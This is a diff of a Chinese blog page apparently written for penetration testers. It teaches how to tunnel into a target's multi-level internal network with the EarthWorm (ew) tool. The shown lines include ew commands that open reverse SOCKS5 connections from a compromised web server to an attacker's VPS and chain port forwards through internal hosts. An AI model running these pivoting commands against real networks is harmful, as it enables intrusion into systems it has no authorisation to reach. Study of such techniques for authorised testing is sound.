@@ -86,18 +86,18 @@
 
 
 
-<meta name="description" content="ew 快速穿透目标多级内网:简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内网数据库服务器,可正常访问公网 假设其内网ip为 192.168.32.170  win7 假设为自己公网的vps 假设其公网ip为 192.1">
+<meta name="description" content="该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）  ew 快速穿透目标多级内网:  简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内">
 <meta name="keywords" content="内网穿透">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用Ew轻松穿透目标多级内网(思维导图待整理)">
 <meta property="og:url" content="http://MaiKeFee.com/archives/a585a37c.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="ew 快速穿透目标多级内网:简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内网数据库服务器,可正常访问公网 假设其内网ip为 192.168.32.170  win7 假设为自己公网的vps 假设其公网ip为 192.1">
+<meta property="og:description" content="该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）  ew 快速穿透目标多级内网:  简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-11T15:27:25.418Z">
+<meta property="og:updated_time" content="2019-09-11T16:12:15.261Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用Ew轻松穿透目标多级内网(思维导图待整理)">
-<meta name="twitter:description" content="ew 快速穿透目标多级内网:简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内网数据库服务器,可正常访问公网 假设其内网ip为 192.168.32.170  win7 假设为自己公网的vps 假设其公网ip为 192.1">
+<meta name="twitter:description" content="该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）  ew 快速穿透目标多级内网:  简要环境说明:一层正向穿透(处于公网):win2008R2 假设为目标边界web服务器,可正常访问公网  假设其公网ip为 192.168.3.23 假设其内网ip为 192.168.32.131  win2008 假设为目标内">
 
 
 
@@ -358,8 +358,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-11T23:27:25+08:00">
-                2019-09-11
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-12T00:12:15+08:00">
+                2019-09-12
               </time>
             
           </span>
@@ -479,7 +479,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  5
+                  6
                 </span>
               
             </div>
@@ -500,7 +500,11 @@
       
 
       
-        <h1 id="ew-快速穿透目标多级内网"><a href="#ew-快速穿透目标多级内网" class="headerlink" title="ew 快速穿透目标多级内网:"></a>ew 快速穿透目标多级内网:</h1><h2 id="简要环境说明"><a href="#简要环境说明" class="headerlink" title="简要环境说明:"></a>简要环境说明:</h2><h3 id="一层正向穿透-处于公网"><a href="#一层正向穿透-处于公网" class="headerlink" title="一层正向穿透(处于公网):"></a>一层正向穿透(处于公网):</h3><pre><code>win2008R2 假设为目标边界web服务器,可正常访问公网
+        <p><strong>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）</strong></p>
+<ul>
+<li><h1 id="ew-快速穿透目标多级内网"><a href="#ew-快速穿透目标多级内网" class="headerlink" title="ew 快速穿透目标多级内网:"></a>ew 快速穿透目标多级内网:</h1></li>
+</ul>
+<h2 id="简要环境说明"><a href="#简要环境说明" class="headerlink" title="简要环境说明:"></a>简要环境说明:</h2><h3 id="一层正向穿透-处于公网"><a href="#一层正向穿透-处于公网" class="headerlink" title="一层正向穿透(处于公网):"></a>一层正向穿透(处于公网):</h3><pre><code>win2008R2 假设为目标边界web服务器,可正常访问公网
 
 假设其公网ip为 192.168.3.23
 假设其内网ip为 192.168.32.131
@@ -523,7 +527,7 @@ centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
 </blockquote>
 <p>先在 win7上执行,等待目标反弹连接</p>
 <pre><code># ew_for_Win.exe -s rcsocks -l 1080 -e 1234</code></pre><p>在 win2008上执行,反弹socks5连接</p>
-<pre><code># ew_for_Win.exe -s  rssocks -d 192.168.3.232 -e 1234</code></pre><h2 id="复杂内网多层穿透-A-内网-B-内网-C-公网"><a href="#复杂内网多层穿透-A-内网-B-内网-C-公网" class="headerlink" title="复杂内网多层穿透(A(内网)-B(内网)-C(公网))"></a>复杂内网多层穿透(A(内网)-B(内网)-C(公网))</h2><blockquote>
+<pre><code># ew_for_Win.exe -s  rssocks -d 192.168.3.232 -e 1234</code></pre><h2 id="复杂内网多层穿透-A-内网-gt-B-内网-gt-C-公网"><a href="#复杂内网多层穿透-A-内网-gt-B-内网-gt-C-公网" class="headerlink" title="复杂内网多层穿透(A(内网)-&gt;B(内网)-&gt;C(公网))"></a>复杂内网多层穿透(A(内网)-&gt;B(内网)-&gt;C(公网))</h2><blockquote>
 <p>实现复杂内网环境下的跨网段多级穿透:</p>
 </blockquote>
 <h3 id="第一种场景-内网机器不能访问公网"><a href="#第一种场景-内网机器不能访问公网" class="headerlink" title="第一种场景(内网机器不能访问公网)"></a>第一种场景(内网机器不能访问公网)</h3><ul>
@@ -541,7 +545,7 @@ centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
 <pre><code># ew_for_Win.exe -s lcx_tran -l 1090 -f 192.168.32.170 -g 1080</code></pre><p><strong>最后,再回到win7[vps]上去利用Proxifier建立正常的socks代理访问1090端口即可,访问vps的1090就相当于访问内网win2008的1080端口</strong></p>
 <h3 id="第二种场景-还是有些机器不能访问公网的情况"><a href="#第二种场景-还是有些机器不能访问公网的情况" class="headerlink" title="第二种场景(还是有些机器不能访问公网的情况)"></a>第二种场景(还是有些机器不能访问公网的情况)</h3><pre><code>假设win2008在内网且能访问公网但不能访问内网资源,而centos 5.1能访问内网资源但却无法访问公网,而win2008可以访问centos 5.1
 
-这试,我们要想获取内网资源,就可以通过win2008在centos 5.1和win7[vps]之间建立一条socks5    通道,实现过程比较简单,如下</code></pre><p>首先,在win7[实际中的vps]上执行,把来自外部的1080端口的流量转到本地的1379端口上</p>
+这时,我们要想获取内网资源,就可以通过win2008在centos 5.1和win7[vps]之间建立一条socks5    通道,实现过程比较简单,如下</code></pre><p>首先,在win7[实际中的vps]上执行,把来自外部的1080端口的流量转到本地的1379端口上</p>
 <pre><code># ew_for_Win.exe -s lcx_listen -l 1080 -e 1379</code></pre><p>此时回到centos 5.1上执行,在本地启动socks5代理并监听2345端口</p>
 <pre><code># chmod +x ew_for_Linux32
 # ./ew_for_Linux32 -s ssocksd -l 2345</code></pre><p>然后再到win2008上去执行,意思就是把win7[vps]的1379端口和centos 5.1的2345进行绑定,即建立socks5通道</p>
@@ -588,7 +592,7 @@ centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
   <p><span>本文标题:</span>利用Ew轻松穿透目标多级内网(思维导图待整理)</p>
   <p><span>文章作者:</span>MaiKeFee</p>
   <p><span>发布时间:</span>2019年09月11日</p>
-  <p><span>最后更新:</span>2019年09月11日</p>
+  <p><span>最后更新:</span>2019年09月12日</p>
   <p><span>原始链接:</span><a href="/archives/a585a37c.html" title="利用Ew轻松穿透目标多级内网(思维导图待整理)">http://MaiKeFee.com/archives/a585a37c.html</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/a585a37c.html" aria-label="复制成功！"></i></span>
   </p>
@@ -732,7 +736,7 @@ centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-count">59</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -754,7 +758,7 @@ centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -810,6 +814,10 @@ centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
         
         
           <li>
+            <a href="/archives/94014dc0.html" title="基础命令使用[win篇]" target="_blank">基础命令使用[win篇]</a>
+          </li>
+        
+          <li>
             <a href="/archives/e66ca3f3.html" title="对CobaltStrikeDNS隧道的理解与实战" target="_blank">对CobaltStrikeDNS隧道的理解与实战</a>
           </li>
         
@@ -823,10 +831,6 @@ centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
         
           <li>
             <a href="/archives/8833018e.html" title="内网渗透后门(一)：backdoor-factory" target="_blank">内网渗透后门(一)：backdoor-factory</a>
-          </li>
-        
-          <li>
-            <a href="/archives/a9f133be.html" title="windows下hash抓取的几种方式" target="_blank">windows下hash抓取的几种方式</a>
           </li>
         
       </ul>
@@ -848,7 +852,7 @@ centos 5.1 假设为目标内网的一台linux机器,没有dns不能访问公网
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ew-快速穿透目标多级内网"><span class="nav-number">1.</span> <span class="nav-text">ew 快速穿透目标多级内网:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简要环境说明"><span class="nav-number">1.1.</span> <span class="nav-text">简要环境说明:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一层正向穿透-处于公网"><span class="nav-number">1.1.1.</span> <span class="nav-text">一层正向穿透(处于公网):</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一层反向穿透-处于内网可访问公网的情况"><span class="nav-number">1.2.</span> <span class="nav-text">一层反向穿透(处于内网可访问公网的情况)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复杂内网多层穿透-A-内网-B-内网-C-公网"><span class="nav-number">1.3.</span> <span class="nav-text">复杂内网多层穿透(A(内网)-B(内网)-C(公网))</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一种场景-内网机器不能访问公网"><span class="nav-number">1.3.1.</span> <span class="nav-text">第一种场景(内网机器不能访问公网)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二种场景-还是有些机器不能访问公网的情况"><span class="nav-number">1.3.2.</span> <span class="nav-text">第二种场景(还是有些机器不能访问公网的情况)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三种场景-多级内网轻松穿透"><span class="nav-number">1.3.3.</span> <span class="nav-text">第三种场景(多级内网轻松穿透)</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ew-快速穿透目标多级内网"><span class="nav-number">1.</span> <span class="nav-text">ew 快速穿透目标多级内网:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简要环境说明"><span class="nav-number">1.1.</span> <span class="nav-text">简要环境说明:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一层正向穿透-处于公网"><span class="nav-number">1.1.1.</span> <span class="nav-text">一层正向穿透(处于公网):</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一层反向穿透-处于内网可访问公网的情况"><span class="nav-number">1.2.</span> <span class="nav-text">一层反向穿透(处于内网可访问公网的情况)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复杂内网多层穿透-A-内网-gt-B-内网-gt-C-公网"><span class="nav-number">1.3.</span> <span class="nav-text">复杂内网多层穿透(A(内网)-&gt;B(内网)-&gt;C(公网))</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一种场景-内网机器不能访问公网"><span class="nav-number">1.3.1.</span> <span class="nav-text">第一种场景(内网机器不能访问公网)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二种场景-还是有些机器不能访问公网的情况"><span class="nav-number">1.3.2.</span> <span class="nav-text">第二种场景(还是有些机器不能访问公网的情况)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三种场景-多级内网轻松穿透"><span class="nav-number">1.3.3.</span> <span class="nav-text">第三种场景(多级内网轻松穿透)</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
